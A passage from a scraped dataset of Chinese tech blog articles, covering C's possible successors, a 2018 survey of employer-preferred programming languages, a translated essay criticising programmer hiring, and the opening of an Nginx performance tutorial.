语言还会是操作系统的内核编程以及设备固件编程的主流语言，在这些场景下，尽力压榨硬件性能的古老规则还在奏效，尽管它可能不是那么安全。</p>\n<p>现在那些将要被 C 的继任者攻破的领域就是我之前提到的我经常涉及的领域 —— 比如 GPSD 以及 NTPsec、系统服务以及那些因为历史原因而使用 C 语言写的进程。还有就是以 DNS 服务器以及邮件传输代理 —— 那些需要以机器速度而不是人类的速度运行的系统程序。</p>\n<p>现在我们可以对后 C 时代的未来窥见一斑，即上述这类领域的代码都可以使用那些具有强大内存安全特性的 C 语言的替代者实现。Go 、Rust 或者 Cx ，无论是哪个，都可能使 C 的存在被弱化。比如，如果我现在再来重新实现一遍 NTP ，我可能就会毫不犹豫的使用 Go 语言去完成。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113538\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113538votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113538\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "开发", "front_image_url": ["http://wx2.sinaimg.cn/large/7cc829d3ly1fnrhvezgh4j20jx0aggm9.jpg"], "title": "2018 开发者技能调查：这些编程语言受欢迎", "fav_nums": 1, "url": "http://blog.jobbole.com/113526/", "create_date": "2018/01/25", "url_object_id": "6577977ccb5507514a22f0ef401d210d", "comment_nums": 1, "front_image_path": "full/a23d4dd651e63b6379778b3eceede0c0b4e94d72.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/aoi\">伯小乐</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>近日国外开发者平台 HankerRank 发布了 2018 年开发者技能调查报告，本文摘录部分和编程语言相关的调查结果。</p>\n<p>尽管经常有新编程语言出现，但程序员需要掌握核心、传统语言也是非常重要的。 总的来说，在「雇主青睐的编程语言」中，JavaScript、Java、Python、C++、C、C# 和 PHP 排在前位。</p>\n<h3>所有行业</h3>\n<p>JavaScript 第一，Java 稍微比 JS 少一点排第二，Python 第三、C++ 第四、C 第五；</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3ly1fnrhvezgh4j20jx0aggm9.jpg\"></p>\n<h3>汽车 &amp; 运输行业</h3>\n<p>JS 第一、Java 第二、Python 第三、C++ 第四、C# 第五；</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3ly1fnrhrvb4gnj20k30ag0tf.jpg\"></p>\n<h3>计算机硬件</h3>\n<p>C 语言和 C++ 的需求量，明显高于其他语言。Python 第三、Java 第四、JS 第五；</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/7cc829d3ly1fnrhw6oxxnj20k20adaaq.jpg\"></p>\n<h3>金融服务</h3>\n<p>Java 第一、JS 第二、Python 第三、C# 第四、C++ 第五；</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/7cc829d3ly1fnrhrwgvvej20jw0ahaaq.jpg\"></p>\n<h3>政府</h3>\n<p>Java 第一、JS 第二、C# 第三</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3ly1fnrhrx8xc9j20jw0a974x.jpg\"></p>\n<h3>卫生保健</h3>\n<p>JS 第一、Java 第二、Python 第三、C# 第四</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/7cc829d3ly1fnrhrxts28j20jw0abdgh.jpg\"></p>\n<h3>媒体/娱乐/游戏</h3>\n<p>JS 第一、Python 第二、Java 第三、PHP 第四</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3ly1fnrhrydd76j20jx0agmxv.jpg\"></p>\n<h3>零售 &amp; 电商</h3>\n<p>Java 第一、JS 第二、Python 第三</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/7cc829d3ly1fnrhryzgeej20jv0a63z6.jpg\"></p>\n<h3>安全</h3>\n<p>Java 第一、Python 第二、JS 第三、C++ 第四、C 第五；</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/7cc829d3ly1fnrhw76pymj20k109qq3k.jpg\"></p>\n<h3>技术</h3>\n<p>Java 第一、JS 第二、Python 第三、C++ 第四、C 第五；</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/7cc829d3ly1fnrhs05ww2j20ju09r0td.jpg\"></p>\n<h3>开发者计划学习的编程语言</h3>\n<ol>\n<li>Go （得益于 Google）</li>\n<li>Python</li>\n<li>Scala</li>\n<li>Kotlin</li>\n<li>Ruby</li>\n<li>R</li>\n<li>Typescript</li>\n<li>Swift</li>\n<li>Rust</li>\n<li>Haskell</li>\n</ol>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fnrq4gi03wj20jm0cq3zk.jpg\"></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113526\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113526votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113526\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">伯小乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/11/f2bb4f6f428a49476a2e91c355c8d150.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/aoi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/aoi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/aoi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 261</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "其他", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/7dd60e003318e539f9469a088c0cac3b.png"], "title": "一个技术大牛对程序员招聘的吐槽和建议", "fav_nums": 0, "url": "http://blog.jobbole.com/113532/", "create_date": "2018/01/26", "url_object_id": "e81ca961a8c2d048c7cc921d4868bb72", "comment_nums": 1, "front_image_path": "full/a4cbdf94fbd0138a52e9c8226246e1bb36133e9e.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/c14033\">十七树</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.b-list.org/weblog/2015/oct/19/destroy-all-hiring-processes/\">James Bennett</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：James Bennett 是一个来自美国西弗吉尼亚州的程序员，Python Web 框架 Django 的核心团队成员之一。做过自由职业者，也做过全职工作。前端、后端都干过。James 对好工具充满热情，所以他一直参与 Django 框架的开发贡献，还有其他开源软件。</p>\n<p>本文是他对程序员招聘的吐槽，最后给了一些建议。</p>\n<hr>\n<p><strong>作为软件人，找工作有时候似乎挺苦逼的。</strong></p>\n<p>说真的，让我去掉前面这句中“似乎”二字吧。<span style=\"color: #ff0000;\">就是苦逼！</span>很多人都曾抱怨处在招聘的一方很糟糕——我们没有任何可靠的方式来甄别会写代码并且写得好的人。<span style=\"color: #ff0000;\">这的确是真的，我们这行在这方面做得很糟糕</span>。即使是在最常见的开发者群体（美国人、男性、白人、较为年轻和中产背景）当中，我们的甄别能力也绝对是一败涂地，而当面对更广泛的人群时，我们只会干得更差。但我们不得不扩大范围，因为就算我们没有道德感，我们也面临着数量的问题，职位岗位比上述“精英”多，总共只有那么多美国中产二十多岁的白人男性，然后其中一半根本不会应聘你们只发股权的“支持Uber、23andme、推特、部落冲突的无人机运输”公司，因为他们正在你创业的星巴克马路对面的另一家星巴克成立自己的公司。另一方面称职并且想要技术岗位却没得到的女性、非白人、外国人数量简直太多了。</p>\n<p>但是应聘的一方（我现在所在的一方）也很苦逼。招聘方遇到的困境，也恰恰是造成痛苦流程的原因。</p>\n<h3>教育很烂</h3>\n<p>我们尝试过的其中一个方法是看学历。但是我们根本不擅长在学校教人编程。涉及到计算机的课程，应该是数学系还是工程系的延伸，多数大学都决定不下来。结果他们最后弄出来的是诡异的融合，但其实两者都不是；或者他们在教编程，但是语言和技术已经落后现有规范好多年；又或者他们让学生死记算法列表及其复杂度，这会让学生误以为编程不过是死记硬背，然后成为一个能输出正确算法名字和伪代码的自动机。因为公司真正想找的是就是复读机，难道不是吗？直接开发一个数据结构的复读机，可能再加上一个排序算法的复读机，大概就能省下很多面试的时间。</p>\n<p>我深信现有的教育方式及其缺陷，是造成我们听到的软件招聘恐怖故事的原因。拥有 CS 硕士学位，却似乎不能从一张白纸开始写代码的人，其实不差；更有可能是他们受到的教育轻视实际编程而注重理论。在邮件列表和论坛发布“请给我写好的代码”帖子的人，其实不差；更有可能他们受到的教育建基于背诵和应试。另外如果你从没读过<a href=\"http://v.cx/2010/04/feynman-brazil-education\">著名物理学家费曼造访一所采用这个方法的大学的故事</a>，我强烈推荐它。</p>\n<p>那仍然是编程教学处在的阶段：我们知道自己需要程序员，而我们没有足够多的程序员来写代码，更别说教出更多的程序员，所以这种死记硬背的现象广泛存在，这是因为这已经是我们现在力所能及的范围。我们只是希望我们“教”出来的学生，会跑去看 Ruby on Rails 的教程，然后无意中看见 GitHub 的文档，然后从中神奇地学会真正的软件开发、架构和最佳规范。因为大家都明白，他们不可能在学校里学会这些。</p>\n<p>与此同时另一方面，在我合作过的技术牛人当中，大多数根本没有软件工程和计算机科学的大学背景；很多人直到快上完学才第一次写代码（ 不要脸的偏见：我直到快大学毕业才开始通常意义上的“编程”，我也是在毕业几年后才开始以此谋生）。很多真正厉害的人会被“计算机科学本科”这一条件过滤掉，这是招聘方不谨慎定下职位要求时会遇到的问题。即使招聘方费心加上“或拥有相当的经验”，他们甚至也还是被过滤掉，因为履历上的学位似乎就是招聘者和 HR 筛选推送给实际技术人员的求职者的第一条依据。</p>\n<p>顺带一提，我有一个哲学学位。并不是炫耀，不过软件领域很多我认识并尊敬的非常厉害的人都有着相同的背景。</p>\n<p>所以将学历作为筛选标准效果并不好；公司也很苦逼，因为拥有 CS 学位并不意味着一个人已经准备好坐下来写代码；准备好写代码的求职者也苦逼，因为没有 CS 学位仍然是个短板，而且为了学位回归学校四年并不轻松。而且每一飞秒都有五万个编程训练营/培训班被启动，从中出来的人拥有哲学系、文学系、神学系、历史系和现代 A 线诗歌符号学的学位，但是当他们经历了训练营后，他们大概至少能和计算机系的学生水平相当，因为 CS 的课程基本都很烂，而且主动加入编程训练营的人通常很聪明而且充满动力。而且如果他们能学会拆解 A 线诗歌，基本就能确认他们能用你的 JavaScript 框架写出一个 CRUD 应用程序，因为那个 JavaScript 框架上周才发布，所以根本没有多少人拥有超过一两天的 ReAngleBoneASS 实战经验。</p>\n<h3>编程面试很烂</h3>\n<p>由于学历不靠谱，另一个甄别会编程的人的方式是编程面试。求职者和公司内部的某人交谈（通常是电话或者视频聊天），并被要求写出解决问题的代码。如果你还保留着好奇心我就告诉你吧，我们不擅长用这个方式选出会编程的人。简单来说，此类面试并不靠谱，因为它们太短、太做作、太压迫。</p>\n<p>详细一点来说：我认识多个顶级人才被他们绝对胜任的职位给拒了，就因为这种编程面试。我倾向于把它们看作“问个谜语”风潮的最新版，这个环节当年由于微软的实施而流行一时，因为每家公司都想像微软一样又大又成功。现在，人们听说谷歌会进行编程面试，并且看到 <a href=\"http://blog.codinghorror.com/why-cant-programmers-program/\">Jeff Atwood 的 FizzBuzz 测试</a>，而每家公司都想像谷歌一样又大又成功，并且与 Jeff Atwood 的招聘恐怖故事产生共鸣，所以现在所有人都在进行编程面试。但是这种面试依旧很烂。可能这是因为谷歌据说用的是白板，而其他公司用的是电话。</p>\n<p>想不想看一个非常称职却因为编程面试而被拒绝的一个例子？他被拒是因为面试官在电话那头笔录错了他念的 Bash 脚本，这当然让脚本出了问题。我绝对没有开玩笑或者夸张，而除了“神经病”我实在找不到其他形容。如果用的是白板，他就被录取了。</p>\n<p>事实上，我十分确定我搞砸过一次编程面试（至少我到现在还没收到该公司的答复）。要记住我并不是刚毕业入行的人。我已经有超过十年的 Web 应用开发经验，处理过各种各样的规模系统；我是一个非常重要的 Web 框架的核心团队成员，并且可能是这方面的世界级专家；我真的写了关于使用该框架的书（最早的几本之一），有时会被聘请去教这个框架，以及被学术会议邀请去做关于这个框架的 keynote 演讲。我曾经有一阵子没怎么睡觉，全程死死盯着一个正在运行的程序，想要理清 Django 的旧式系统，发现我的精神动物是一只迟缓的懒猴，而过了一阵子当我的意识像甘道夫那样重新塞进身体时，我<a href=\"https://github.com/django/django/commit/8a0fa75839\">提交了仅仅两行代码</a>进行反击，解决了五个“深藏 Django 腹中”不同的 bug。我挺擅长这些的，如果你还没注意到的话我希望你记住这点咯。</p>\n<p>我希望你注意到，因为我基本确信我最近搞砸了一次编程面试。</p>\n<p>我不会提那家公司的名字，因为这跟本文无关。我也不会公布他们问的题目，因为那也同样无关。那个题目并没有 FizzBuzz 那么简单，但还是很简单，是我下意识就能提出好几种解决方式的那种问题。面试官否决了我偏好的方法（大概因为这个方法直接调用标准库的函数而无法展示我能手动解决），于是我换了另一个方式。而我从记忆中重新构筑这个方法的时候恰巧犯了一个小错误，因为我过于自信了并且想跟面试官聊其他的，于是我想着我都知道怎么只靠记忆完成这个解决方案了，为啥不赶紧水过这个题目，然后谈谈我真正在乎的事呢。</p>\n<p>顺便一提，我出了一个小笔误，就是我给错误的循环变量加了值。单字母的变量名很糟糕，即使是在你为了敷衍面试官而写的傻瓜程序里；再说白一点，代码能跑起来，但是结果是错误的。</p>\n<p>而当程序跑完然后吐出错误的结果时，我全部的自信都荡然无存，内心OS：“我的个天！为啥不对！我应该知道的呀”，然后我一边疯狂调试，一边尝试向面试官解释我的做法并且回答他们的问题，一边读代码、看结果、加 debug 语句来查看中间值，然后整个气氛是：「哦！提醒一下，这会决定你是否能得到心仪的工作，所以别有任何负担哦」。所以虽然我修改好了，但是用了比正常更多的时间，这让我想到我是不是可能会变成 Atwood 风格的失败招聘故事的新事例。“没错，有个拥有十年经验的人，所谓‘专家’，通过了前两轮电面，结果他居然连这个超级简单的函数都不会写，还花了九牛二虎之力来找到自己的错误。用这题当过滤器真是爽歪歪！”</p>\n<p>如果你曾经在一轮技术面试之后感觉糟糕，如果你曾经感觉你彻底失败，是个废物，不该获得任何职位，只想住到远离计算机、技术和那些让你产生这种情绪的招聘流程的话：我真希望我能说一切正在好转。我能说的是，你并不是一个人。我自身的傲慢和想要赶紧完事然后往下继续的不耐烦，是我在那次面试失败的主因。</p>\n<p>但是那并不会让最终的结果容易接受，也大概不会让这种面试变成公司有力的工具；这些面试似乎就是因为它们自身的属性而无法避免地会挤走合格的候选人。也就是说：缺乏经验的应聘者更有可能缺乏自信而大脑一片空白；或者花费太多力气来想出惊艳面试官的奇招，以至于最终垂死挣扎，看着无能；而有经验的应聘者很可能（我就是）把这种面试看成烦人的形式主义，只想越快搞定越好（约时间进行编程面试的时候，我甚至还跟招聘方开玩笑说我至少能用六种语言写 FizzBuzz，所以他们就直接告诉我想要哪种吧），面试结果只会符合古希腊人教育我们对于过分自信的期望。</p>\n<p>而作为应聘者/候选人，这种面试更是烂。压力太大和缺乏容错空间，总是会让人感觉身体不适。编程面试对精神的虐待也同样糟糕。这真的是一个简单的“来证明你会写 for 循环吧”的题目吗？还是说这是一道藏着面试官想让你发现并阐述的深层问题的陷阱题？这真的只是在考察基本的编程技巧吗？会不会有一些知名的算法或技巧，而你没有的 CS 学位早就会让你滚瓜烂熟，甚至能作为软件共济会的接头暗号？你是不是应该展示你精通这个语言和工具，还是说他们想你开口说出心中所想，来展示你可以好好分析这个问题？如果你能在 A 线诗歌里面藏头打出“FizzBuzz”，面试官会不会对你印象更好？</p>\n<p>这些念头会全程萦绕在你的脑海。他们会使你麻痹，抽空你的自信和思考能力，然后让你看上去完全不胜任。但是 $大公司 就是这么干的，他们又大又有钱又成功，所以其他人也会跟着做，留下一片大脑麻痹、毫无自信、犹豫再三再四再七十四的僵尸程序员，他们只会语气平平大声喊“超出递归最大深度”，而那些公司只会全程抱怨为什么就是找不到人才，然后麻烦谁能清理一下这些僵尸吗？</p>\n<h3>一切都很烂</h3>\n<p>我曾多次处在招聘双方的处境，我也经历过这个欣欣向荣的软件行业的各个阶段的面试（我似乎平均每五年就要找一轮工作，这让我对各个阶段都有一些有趣的印象）。而我从中学到的只是我们干得太糟糕了。科学哲学（我在学校学过一点）有个很有名的“划界问题”：如何区分真正的科学，和那些用 看起来是正经科学的字眼 包装起来的伪科学。这个问题，至今仍没有什么灵丹妙药。</p>\n<p>软件开发也面临着划界问题，但我们的问题有点不同：我们需要知道的不仅仅是谁已经会写代码，还要知道写得多好，而在那些还不会写的有志之士当中，他们还差多少，还需要多少帮助才能做到（换言之，不仅仅是“我们可以聘用谁”，还有“高低职位分别可以聘用谁”，以及“我们可以招哪个实习生然后给他推荐好的培训日后再聘用他”）。这边也没有灵丹妙药；如果存在的话，我们早就找到了，因为很多天才都花了大量的时间在寻找它。</p>\n<p>至今为止，我发现有用的做法总会在其他时候失灵。那包含了审查 GitHub 或其他类似的东西来评估能力；用人际关系和介绍信来找出已经证明自己的人；用对话形式、交换人生故事的面试（也就是面试官和应聘者聊一些看过做过的事，还有他们解决问题的方式）；编程面试；“关键词”面试（我参加过一次面试，目标真的就只是看应聘者有没有“说出关键词”，来看他们是不是真的熟悉这个领域）；高压面试；低压面试；短合同观察期；实习生返聘计划；团队融入面试；结对编程；黑客马拉松；一对一面试；多对一面试；你再随便想一个吧，肯定被使用过了而且成功率最高只有一半。</p>\n<p>因此这对雇主很不利。我应该提到过对应聘者来说也很烂了吧？太多流程都严重有失公允，然后由于面试官和应聘者立场上的鸿沟，这些流程更加糟糕。有时候你甚至不知道有人在评估你（特别是当流程第一环节就是 GitHub 主页筛选的时候），而且被找来主管技术/编程面试的人，经常把这看作一件浪费时间的苦差事，他们不会花时间准备，甚至不会了解一下应聘者，甚至不知道他们来面试什么岗位（我遭遇过好几次这样的情况，我敢说一个连应聘者的简历都懒得看的面试官，是不会让应聘者想要加入他们的）。除此之外，就算是最好的技术面试，也有很强的对抗性因素，这也特别让人不舒服。</p>\n<p>但是作为应聘者，不在面试前恶补公司的技术结构，可能加上一些技术面经，包含排序、搜搜算法和怎么计算费米对芝加哥钢琴调音师人数的估计算法的复杂度。<strong>应聘者事先不做准备，那就太离谱了</strong>。因为就算面试官可以完全不了解应聘者和那个职位，应聘者必须做足功夫，说不定面试官真的会问调音师那道题。</p>\n<p>我知道理论上这种非人性化和脱节，是太多人申请技术岗位的副作用；让流程人性化和处理所有申请，这两者不可兼得。但这肯定会让求职者充满苦涩。我真希望，我能感觉我是作为一个将要成为同事的人在接受面试，而不是由可替换齿轮 #7365 作为可替换齿轮 #9540 岗位的面试官，然后由于更多的可替换齿轮在排队面试而时间有限。而且如果你是最早的五千个齿轮，你只能获得股权。</p>\n<p>这完全没考虑到人与人的差别，有些人擅长应对形式化的面试，而有些人并不擅长。（这两点都看不出，这个人会在真正的工作环境做得如何；如果看得出的话，那某种程度上，这些面试技巧可以用来申请我并不想要的那种职位。）</p>\n<h3>那我们该怎么做?</h3>\n<p><strong>老实说，我根本不知道。技术招聘对各方来说都很烂，而且没有简单的解决方式</strong>。甚至都没有能让我们撑到解决方式出炉的权宜之计。不过我还是会提一些东西，只因为洋洋洒洒写 3,000 字吐槽却不提出建议，看上去太糟糕了。</p>\n<p><strong>一旦一家公司大到分离出专门的招聘团队或部门时，HR 就会变成应聘者和现有员工双方的痛点。</strong>我的意思是应聘者面对的很多招聘者，他们自己都只是刚刚找到工作。这就降低了他们的反应能力以及说服其他人这家公司值得加入的能力，拖慢了整个招聘流程。如果你的招聘团队像旋转门一样很多人进进出出，你就该找出原因并解决问题，保证你放在那里的人真的了解公司，了解你在找的人才，别让任何一方（应聘者或需要信任的团队）空等。说的就是你，上次电话一个礼拜了都还没发送“招聘进度”邮件的某某公司。</p>\n<p><strong>当你依靠开发者进行面试时，请负责任地排好班。</strong>你已经在占用他们的时间，而且强迫他们切换注意力了；确保他们有足够的时间来不仅仅是打一个 30 分钟的电话，还要浏览应聘者的简历、GitHub 等，了解他们主管的职位的细节。跟一个能说出“我发现你做了/贡献了（项目）”并且能把这个项目跟公司和职位扯上关系的人交谈虽然只是一个小美好，但是小美好可以产生深远的影响。还有要确保面试官想要当面试官；我能判断出对方很明显只想面试赶紧结束然后回到“宏图大计”，这很糟糕。</p>\n<p><strong>别搞编程面试，如果可以的话，看看应聘者写过的代码，或者向他们描述你最近遇到的一个小 bug，然后问他们会怎么解决。如果你能相处跟职位相关的问题那就更好了。</strong>让应聘者选择在电话上解释，或者写下来发邮件给你。我认识一些能写出神级代码却没办法开口好好解释的人，我也认识擅长开口解释却害怕写哪怕只是零散代码的人；除非你的职位要求特别的演说/写作能力，不然就别偏向任何一边。如果你必须进行编程面试，把用时和压力控制在合理的范围——你家的开发者都未必能在 30 分钟内在面对陌生人电话听写软件输出的情况下解决 bug，那就别强迫应聘者了。还有，你可以让讨厌面试的开发者改变心态：“这不是面试，是代码评估”。所有人都能把代码评估“电解”成 Agile™ 和 Lean® 等等的关键词。代码评估有开发者渴望的元素！</p>\n<p><strong>在所有这些之上最重要的是，请人性化一些。我们不是机器</strong>；我们只是让机器做有趣的事情。有时候我们甚至可以让它们做正确而有趣的事情。但我们终究是人类，而现在的招聘流程存在鸿沟般严重的人性化缺失。对人类人性化一些吧，其他所有事情都会轻松很多。</p>\n<p>还有，如果你正在寻找可以让机器做有趣事情的人，我还在等待合适的招聘者，所以可以来<a href=\"http://www.b-list.org/contact/\">联系我</a>。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113532\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113532votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113532\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/c14033\">十七树</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/c14033\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            香港大学在读博士生，研究 GPGPU        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/c14033\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/c14033/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/c14033/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2013/07/Nginx-Logo.jpg"], "title": "Nginx 教程（2）：性能", "fav_nums": 2, "url": "http://blog.jobbole.com/113572/", "create_date": "2018/01/29", "url_object_id": "a30dd57d9dcf828544d8fc52dbaabef1", "comment_nums": 0, "front_image_path": "full/2d4fd40c8eaec8319c1de2f154b3275aecd23f9d.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.netguru.co/codestories/nginx-tutorial-performance\">netguru</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/nginx-tutorial-performance\">开源中国</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/52dfd28844c7c6a190eecae956856438.jpg\"></p>\n<p>大家好，分享即关爱，我们很乐意和你分享一些新的知识，我们准备了一个 Nginx 的教程，分为三个系列，如果你对 Nginx 有所耳闻，或者想增进 Nginx 方面的经验和理解，那么恭喜你来对地方了。</p>\n<p>我们会告诉你 Nginx 如何工作及其背后的理念，还有如何优化以加快应用的性能，如何安装启动和保持运行。</p>\n<p>这个教程有三个部分：</p>\n<ul>\n<li>基本概念 —— 这部分需要去了解 Nginx 的一些指令和使用场景，继承模型，以及 Nginx 如何选择 server 块，location 的顺序。</li>\n<li>性能 —— 介绍改善 Nginx 速度的方法和技巧，我们会在这里谈及 gzip 压缩，缓存，buffer 和超时。</li>\n<li>SSL 安装 —— 如何配置服务器使用 HTTPS</li>\n</ul>\n<p>创建这个系列，我们希望，一是作为参考书，可以通过快速查找到相关问题（比如 gzip 压缩，SSL 等）的解决方式，也可以直接通读全文。为了获得更好的学习效果，我们建议你在本机安装 Nginx 并且尝试进行实践。</p>\n<h2><code>tcp_nodelay</code>, <code>tcp_nopush</code> 和 <code>sendfile</code></h2>\n<h3><code>tcp_nodelay</code></h3>\n<p>在 TCP 发展早期，工程师需要面对流量冲突和堵塞的问题，其中涌现了大批的解决方案，其中之一是由 John Nagle 提出的算法。</p>\n<p>Nagle 的算法旨在防止通讯被大量的小包淹没。该理论不涉及全尺寸 tcp 包（最大报文长度，简称 